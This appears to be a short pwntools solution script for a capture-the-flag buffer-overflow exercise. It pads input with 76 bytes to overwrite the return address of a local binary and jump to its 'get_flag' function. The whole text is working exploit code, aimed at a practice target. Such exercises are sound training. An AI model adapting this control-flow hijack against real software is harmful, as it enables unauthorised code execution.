from pwn import *

p = process('./bof_ret')
e = ELF('./bof_ret')

p.recv()
payload = 'A'*76
payload += p32(e.sym['get_flag'])
p.send(payload)

p.interactive()
